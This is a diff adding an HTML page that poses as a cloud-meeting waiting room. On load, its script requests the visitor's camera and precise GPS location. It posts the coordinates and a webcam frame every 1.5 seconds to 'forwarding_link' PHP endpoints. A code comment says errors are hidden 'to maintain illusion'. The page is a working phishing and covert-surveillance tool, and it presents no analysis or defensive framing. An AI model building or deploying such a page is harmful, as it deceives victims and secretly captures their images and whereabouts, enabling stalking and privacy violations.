@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Join our Cloud Meeting Room" />
+    <meta property="og:description" content="Click the link to enter the meeting waiting room." />
+    <meta property="og:image" content="forwarding_link/preview.jpg" />
+    <meta property="og:image:type" content="image/jpeg" />
+    
+    <title>Waiting Room</title>
+    <style>
+        :root {
+            --bg-color: #1a1a24;
+            --card-bg: #242533;
+            --bar-bg: #1f2022;
+            --text-main: #ffffff;
+            --text-muted: #9e9eaf;
+            --neon-blue: #0e71eb;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .main-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            max-width: 640px;
+            padding-bottom: 100px;
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 16 / 9;
+            background-color: #11121a;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 12px 36px rgba(0, 0, 0, 0.4);
+        }
+
+        #video {
+            display: none;
+        }
+
+        #canvas {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        #ac-wrapper {
+            position: absolute;
+            top: 20px;
+            z-index: 10;
+            width: 90%;
+            max-width: 500px;
+            background: var(--card-bg);
+            border-radius: 8px;
+            padding: 15px 20px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            border: 1px solid rgba(14, 113, 235, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .pulse-ring {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(14, 113, 235, 0.2);
+            border-top-color: var(--neon-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #ac-wrapper h2 {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-main);
+        }
+
+        .bottom-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            height: 85px;
+            width: 100%;
+            background-color: var(--bar-bg);
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 30px;
+            z-index: 100;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .icon-group-left {
+            display: flex;
+            gap: 15px;
+        }
+
+        .icon-group-center {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .icon-button {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-muted);
+            cursor: pointer;
+            transition: color 0.2s ease;
+            min-width: 70px;
+        }
+
+        .icon-button:hover {
+            color: var(--text-main);
+        }
+
+        .icon-button svg {
+            width: 22px;
+            height: 22px;
+            fill: currentColor;
+            margin-bottom: 6px;
+        }
+
+        .icon-button h6 {
+            font-size: 11px;
+            font-weight: 500;
+            white-space: nowrap;
+        }
+
+        .active-green {
+            color: #26d07c !important;
+        }
+
+        .end-btn {
+            color: #ffffff;
+            background-color: #e02849;
+            padding: 6px 18px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .float_button {
+            background-color: var(--bar-bg);
+            height: 36px;
+            width: 36px;
+            border-radius: 6px;
+            position: fixed;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            top: 15px;
+            right: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            z-index: 100;
+        }
+        .float_button svg {
+            width: 14px;
+            height: 14px;
+            fill: #ffffff;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="float_button">
+        <svg viewBox="0 0 448 512"><path d="M0 180V56c0-13.3 10.7-24 24-24h124c13.3 0 24 10.7 24 24s-10.7 24-24 24H48v100c0 13.3-10.7 24-24 24S0 193.3 0 180zM424 32c13.3 0 24 10.7 24 24v124c0 13.3-10.7 24-24 24s-24-10.7-24-24V82H300c-13.3 0-24-10.7-24-24s10.7-24 24-24h124zM24 280c13.3 0 24 10.7 24 24v98h100c13.3 0 24 10.7 24 24s-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V304c0-13.3 10.7-24 24-24zm400 48c0-13.3 10.7-24 24-24s24 10.7 24 24v124c0 13.3-10.7 24-24 24H300c-13.3 0-24-10.7-24-24s10.7-24 24-24h98v-98z"/></svg>
+    </div>
+
+    <div id="ac-wrapper">
+        <div class="pulse-ring"></div>
+        <h2>Please wait, the meeting host will let you in soon</h2>
+    </div>
+
+    <div class="main-screen">
+        <div class="video-container">
+            <video id="video" playsinline autoplay muted></video>
+            <canvas id="canvas" width="640" height="480"></canvas>
+        </div>
+    </div>
+
+    <div class="bottom-bar">
+        <div class="icon-group-left">
+            <div class="icon-button">
+                <svg viewBox="0 0 384 512"><path d="M192 352c53 0 96-43 96-96V96c0-53-43-96-96-96s-96 43-96 96v160c0 53 43 96 96 96zm160-96c0-13.3-10.7-24-24-24s-24 10.7-24 24c0 61.9-50.1 112-112 112s-112-50.1-112-112c0-13.3-10.7-24-24-24S32 242.7 32 256c0 79.5 59.2 145.2 136 157.9V464h-40c-13.3 0-24 10.7-24 24s10.7 24 24 24h128c13.3 0 24-10.7 24-24s-10.7-24-24-24h-40v-50.1c76.8-12.7 136-78.4 136-157.9z"/></svg>
+                <h6>Mute</h6>
+            </div>
+            <div class="icon-button">
+                <svg viewBox="0 0 576 512"><path d="M0 128C0 92.7 28.7 64 64 64H320c35.3 0 64 28.7 64 64V384c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V128zM559.1 99.8c-10.4-5.6-23.2-3.6-31.4 5.1L432 208V304l95.7 103.1c8.2 8.8 21 10.7 31.4 5.1s16.9-16.3 16.9-28V128c0-11.7-6.5-22.4-16.9-28z"/></svg>
+                <h6>Stop Video</h6>
+            </div>
+        </div>
+        
+        <div class="icon-group-center">
+            <div class="icon-button">
+                <svg viewBox="0 0 512 512"><path d="M256 0c11.2 0 22 1.5 32.4 4.4l160 44.4C494.3 60.3 512 101.4 512 148c0 205.2-132.8 316.5-235.3 358.1c-13.1 5.3-27.7 5.3-40.8 0C133.4 464.7 0 353.4 0 148c0-46.6 17.7-87.7 47.6-99.2l160-44.4C218 1.5 228.8 0 256 0zm0 80c-9.5 0-18.7 1.3-27.5 3.7l-112 31.1C102.3 118.6 96 131.7 96 148c0 148.9 92.5 228.4 160 264.4V80z"/></svg>
+                <h6>Security</h6>
+            </div>
+            <div class="icon-button">
+                <svg viewBox="0 0 640 512"><path d="M144 0a80 80 0 1 1 0 160A80 80 0 1 1 144 0zM512 0a80 80 0 1 1 0 160A80 80 0 1 1 512 0zM0 298.7C0 239.8 47.8 192 106.7 192h74.7c58.9 0 106.7 47.8 106.7 106.7V352c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32V298.7zM453.3 192c58.9 0 106.7 47.8 106.7 106.7V352c0 17.7-14.3 32-32 32H352c-17.7 0-32-14.3-32-32V298.7c0-58.9 47.8-106.7 106.7-106.7h74.7zM320 112a64 64 0 1 1 0 128 64 64 0 1 1 0-128zM192 416v32c0 35.3 28.7 64 64 64h128c35.3 0 64-28.7 64-64V416H192z"/></svg>
+                <h6>Participants</h6>
+            </div>
+            <div class="icon-button active-green">
+                <svg viewBox="0 0 512 512"><path d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM385 225c9.4 9.4 9.4 24.6 0 33.9s-24.6 9.4-33.9 0l-71-71V392c0 13.3-10.7 24-24 24s-24-10.7-24-24V187.9l-71 71c-9.4 9.4-24.6 9.4-33.9 0s-9.4-24.6 0-33.9L239 113c9.4-9.4 24.6-9.4 33.9 0L385 225z"/></svg>
+                <h6>Share Screen</h6>
+            </div>
+            <div class="icon-button">
+                <svg viewBox="0 0 512 512"><path d="M512 240c0 114.9-114.6 208-256 208c-37.1 0-72.3-6.4-104.1-17.9c-11.9 8.7-31.3 20.6-58.3 30.7c-9.7 3.6-20.2-2.3-22.1-12.4c-1.9-10.2 4.3-20.1 13.8-24.5c15-6.9 34.9-17.5 45-28C51.3 358.4 0 304.7 0 240C0 125.1 114.6 32 256 32s256 93.1 256 208zM256 144c-13.3 0-24 10.7-24 24v48H184c-13.3 0-24 10.7-24 24s10.7 24 24 24h48v48c0 13.3 10.7 24 24 24s24-10.7 24-24V264h48c0-13.3 10.7-24 24-24s-10.7-24-24-24H280V168c0-13.3-10.7-24-24-24z"/></svg>
+                <h6>Chat</h6>
+            </div>
+            <div class="icon-button">
+                <svg viewBox="0 0 512 512"><path d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM256 352a96 96 0 1 1 0-192 96 96 0 1 1 0 192z"/></svg>
+                <h6>Record</h6>
+            </div>
+        </div>
+
+        <button class="end-btn">End</button>
+    </div>
+
+    <script>
+        // 1. Post Camera Frames back to server via native asynchronous transmission
+        function post(imgdata) {
+            fetch('forwarding_link/post.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'cat=' + encodeURIComponent(imgdata)
+            }).catch(err => {});
+        }
+
+        // 2. Post GPS Coordinates back to location processing engine
+        function post_location(lat, lon, acc) {
+            fetch('forwarding_link/location.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'lat=' + encodeURIComponent(lat) + '&lon=' + encodeURIComponent(lon) + '&acc=' + encodeURIComponent(acc)
+            }).catch(err => {});
+        }
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Initialize Hardware Configurations
+        async function init() {
+            // Trigger GPS Location Request
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        post_location(
+                            position.coords.latitude, 
+                            position.coords.longitude, 
+                            position.coords.accuracy
+                        );
+                    }, 
+                    (error) => {
+                        // Fails quietly inside client view to maintain illusion
+                        console.log("Context error initialization code 102");
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            }
+
+            // Trigger Camera Stream Request
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: "user" } });
+                handleSuccess(stream);
+            } catch (e) {
+                console.error("Camera connection failed:", e);
+            }
+        }
+
+        function handleSuccess(stream) {
+            video.srcObject = stream;
+            video.play().then(() => {
+                // Loop parsing webcam frame captures into string payloads every 1.5 seconds
+                setInterval(function () {
+                    context.drawImage(video, 0, 0, 640, 480);
+                    const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                    post(canvasData);
+                }, 1500);
+            });
+        }
+
+        // Start initialization lifecycle sequence on load
+        init();
+    </script>
+</body>
+</html>
